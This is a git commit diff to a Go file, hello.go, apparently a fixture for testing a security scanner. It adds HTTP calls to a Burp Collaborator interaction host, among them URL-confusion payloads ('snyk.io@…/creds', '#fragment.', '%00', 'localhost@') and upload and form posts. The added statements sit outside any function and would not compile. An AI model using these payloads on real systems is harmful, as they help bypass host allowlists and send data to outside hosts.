750690e0061a252269fe214030a78c00c54f5b4c
Aaron James <aaron.c.james@gmail.com>
2022-03-03 09:35:25 -0500

    another commit

--- hello.go
+++ hello.go
@@ -8,7 +8,17 @@ func main() {
     fmt.Println(quote.Go())
 }
 
-resp, err := http.Get("mh7oavm9vc0z0q0ammmq38igo7uxim.burpcollaborator.net")
+resp, err := http.Get("mh7oavm9vc0z0q0ammmq38igo7uxim.burpcollaborator.net/vanilla")
+resp, err := http.Get("snyk.io#fragment.mh7oavm9vc0z0q0ammmq38igo7uxim.burpcollaborator.net")
+resp, err := http.Get("snyk.io@mh7oavm9vc0z0q0ammmq38igo7uxim.burpcollaborator.net/creds")
+resp, err := http.Get("snyk.io.mh7oavm9vc0z0q0ammmq38igo7uxim.burpcollaborator.net")
+resp, err := http.Get("mh7oavm9vc0z0q0ammmq38igo7uxim.burpcollaborator.net%00snyk.io")
+
+resp, err := http.Get("localhost#fragment.mh7oavm9vc0z0q0ammmq38igo7uxim.burpcollaborator.net")
+resp, err := http.Get("localhost@mh7oavm9vc0z0q0ammmq38igo7uxim.burpcollaborator.net/creds")
+resp, err := http.Get("localhost.mh7oavm9vc0z0q0ammmq38igo7uxim.burpcollaborator.net")
+resp, err := http.Get("mh7oavm9vc0z0q0ammmq38igo7uxim.burpcollaborator.net%00localhost")
+
 resp, err := http.Post("http://mh7oavm9vc0z0q0ammmq38igo7uxim.burpcollaborator.net/upload", "image/jpeg", &buf)
 resp, err := http.PostForm("http://mh7oavm9vc0z0q0ammmq38igo7uxim.burpcollaborator.net/form",
 	url.Values{"key": {"Value"}, "id": {"123"}})
